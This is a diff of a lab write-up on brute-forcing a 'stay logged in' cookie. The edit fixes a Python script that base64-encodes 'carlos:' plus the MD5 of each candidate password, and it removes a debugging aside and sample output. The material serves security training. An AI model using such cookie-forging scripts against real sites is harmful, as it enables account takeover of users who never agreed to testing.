@@ -179,43 +179,8 @@ base64 encoding:
 
 We will found a `200 OK` response, that means we solved the lab :)
 
-## fix this script!!
+## python script to populate cookie list
 
-
-the first value should be:
-
-`Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl`
-
-while I have:
-
-`Y2FybG9zOmY0NDdiMjBhN2ZjYmY1M2E1ZDViZTAxM2VhMGIxNWFm`
-
-
-This code will generate md5 hashes for every password:
-
-```python
-import hashlib
-f = open("candidate-passwords.txt")
-for l in f:
-    print(hashlib.md5(l.encode()).hexdigest())
-```
-
-```
-f447b20a7fcbf53a5d5be013ea0b15af
-286755fad04869ca523320acce0dc6a4
-23cdc18507b52418db7740cbb5543e54
-a86850deb2742ec3cb41518e26aa2d89
-b2cfa4183267af678ea06c7407d4d6d8
-d577273ff885c3f84dadb8578bb41399
-e7df7cd2ca07f4f1ab415d457a6e1c13
-..
-..
-..
-```
-
-
-
-This Python script will produce the full string for cookie value (this is an example with 3 first lines):
 
 ```python
 #!/usr/bin/python3
@@ -225,20 +190,10 @@ import hashlib
 
 f = open("3password")
 for l in f:
-    bb = hashlib.md5(l.encode()).hexdigest()
-    fs = ("carlos"+str(":")+str(bb))
+    bb = hashlib.md5(bytes(l.rstrip().encode())).hexdigest()
+    fs = ("carlos"+str(":")+bb)
     print(base64.b64encode(fs.encode()).decode('ascii'))
 ```
-
-```
-Y2FybG9zOmY0NDdiMjBhN2ZjYmY1M2E1ZDViZTAxM2VhMGIxNWFm
-Y2FybG9zOjI4Njc1NWZhZDA0ODY5Y2E1MjMzMjBhY2NlMGRjNmE0
-Y2FybG9zOjIzY2RjMTg1MDdiNTI0MThkYjc3NDBjYmI1NTQzZTU0
-```
-
-We can now generate our full list of cookie values.
-
-
 
 
 
